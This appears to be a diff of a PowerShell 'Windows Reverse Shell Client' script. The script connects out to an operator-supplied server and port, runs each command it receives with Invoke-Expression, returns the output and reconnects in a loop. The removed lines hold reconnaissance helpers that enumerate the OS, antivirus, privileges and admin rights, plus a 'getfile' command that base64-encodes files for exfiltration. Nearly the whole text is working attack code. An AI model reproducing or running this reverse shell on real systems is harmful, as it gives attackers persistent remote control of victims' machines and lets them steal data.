@@ -1,92 +1,14 @@
 # Windows Reverse Shell Client
-# Requires PowerShell 5.1 or higher
 
 param(
     [Parameter(Mandatory=$true, HelpMessage="Server IP address to connect to")]
     [string]$Server,
     
     [Parameter(Mandatory=$true, HelpMessage="Server port to connect to")]
-    [int]$Port,
-    
-    [Parameter(Mandatory=$false)]
-    [switch]$Help
+    [int]$Port
 )
 
-if ($Help) {
-    Write-Host "LSTNR Client"
-    Write-Host ""
-    Write-Host "Usage: .\client.ps1 -Server <IP> -Port <PORT>"
-    Write-Host ""
-    Write-Host "Parameters:"
-    Write-Host "  -Server    Server IP address to connect to"
-    Write-Host "  -Port      Server port to connect to"
-    Write-Host "  -Help      Show this help message"
-    exit
-}
-
 $Global:ReconnectDelay = 5
-
-function Test-Administrator {
-    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-}
-
-function Get-WindowsPrivileges {
-    try {
-        $privileges = whoami /priv | Where-Object { $_ -match "Enabled" }
-        return ($privileges -join "`n")
-    } catch {
-        return "Failed to get privileges: $_"
-    }
-}
-
-function Get-SystemDetails {
-    $os = Get-WmiObject -Class Win32_OperatingSystem
-    $cpu = Get-WmiObject -Class Win32_Processor
-    $av = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
-
-    $sysinfo = @"
-=== System Information ===
-OS: $($os.Caption) $($os.Version)
-Architecture: $($env:PROCESSOR_ARCHITECTURE)
-Computer: $($env:COMPUTERNAME)
-Domain: $($env:USERDOMAIN)
-Username: $($env:USERNAME)
-Admin Rights: $(Test-Administrator)
-CPU: $($cpu.Name)
-Antivirus: $($av.displayName)
-"@
-    return $sysinfo
-}
-
-function Get-FileContent {
-    param([string]$filepath)
-    
-    try {
-        Write-Host "[*] Reading file: $filepath"
-        $bytes = [System.IO.File]::ReadAllBytes($filepath)
-        $encoded = [Convert]::ToBase64String($bytes)
-        Write-Host "[*] File read successfully, size: $($bytes.Length) bytes"
-        return $encoded
-    } catch {
-        Write-Host "[!] Error reading file: $_"
-        return "ERROR: $_"
-    }
-}
-
-function Invoke-PowerShellCommand {
-    param([string]$command)
-    
-    try {
-        $output = Invoke-Expression -Command $command | Out-String
-        if ([string]::IsNullOrEmpty($output)) {
-            return "Command executed successfully (no output)"
-        }
-        return $output
-    } catch {
-        return "Error executing command: $_"
-    }
-}
 
 while ($true) {
     try {
@@ -99,65 +21,44 @@ while ($true) {
         $writer = New-Object System.IO.StreamWriter($stream)
         $reader = New-Object System.IO.StreamReader($stream)
         
-        # Send initial empty data
-        $writer.WriteLine()
-        $writer.Flush()
-        
         while ($client.Connected) {
             $command = $reader.ReadLine()
-            
             if ([string]::IsNullOrEmpty($command)) { continue }
-            
+
             Write-Host "[*] Received command: $command"
-            
+
             if ($command -eq "die") {
                 Write-Host "[!] Received kill-session command. Shutting down..."
-                if ($client -ne $null) { $client.Close() }
-                if ($writer -ne $null) { $writer.Close() }
-                if ($reader -ne $null) { $reader.Close() }
-                [Environment]::Exit(0)  # Force exit the script
+                $client.Close()
+                Exit
             }
-            
-            $output = switch -Regex ($command) {
-                "^getfile:(.*)" {
-                    $filepath = $matches[1]
-                    Get-FileContent -filepath $filepath
-                }
-                "^sysinfo$" {
-                    Get-SystemDetails
-                }
-                "^privileges$" {
-                    Get-WindowsPrivileges
-                }
-                "^whoami$" {
-                    "$env:USERDOMAIN\$env:USERNAME"
-                }
-                "^hostname$" {
-                    $env:COMPUTERNAME
-                }
-                "^osinfo$" {
-                    [System.Environment]::OSVersion.VersionString
-                }
-                default {
-                    Invoke-PowerShellCommand -command $command
-                }
+
+            # Execute the command and prepare output
+            $tempFile = [System.IO.Path]::GetTempFileName()
+            try {
+                Invoke-Expression -Command $command | Out-File -FilePath $tempFile -Encoding UTF8
+                $output = Get-Content -Path $tempFile -Raw
+            } catch {
+                $output = "Error executing command: $_"
+            } finally {
+                if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force }
             }
-            
-            if ($output) {
-                $writer.WriteLine($output)
-                $writer.Flush()
-            }
+
+            # Append EOF marker
+            $output += "`nEOF"
+
+            # Send output back to the server
+            $writer.WriteLine($output)
+            $writer.Flush()
         }
-    }
-    catch {
+    } catch {
         Write-Host "[-] Connection failed: $_"
+    } finally {
+        if ($client) { $client.Close() }
+        if ($writer) { $writer.Close() }
+        if ($reader) { $reader.Close() }
     }
-    finally {
-        if ($client -ne $null) { $client.Close() }
-        if ($writer -ne $null) { $writer.Close() }
-        if ($reader -ne $null) { $reader.Close() }
-    }
-    
-    Write-Host "[*] Attempting to reconnect in $ReconnectDelay seconds..."
+
+    Write-Host "[*] Reconnecting in $ReconnectDelay seconds..."
     Start-Sleep -Seconds $ReconnectDelay
-} 
+}
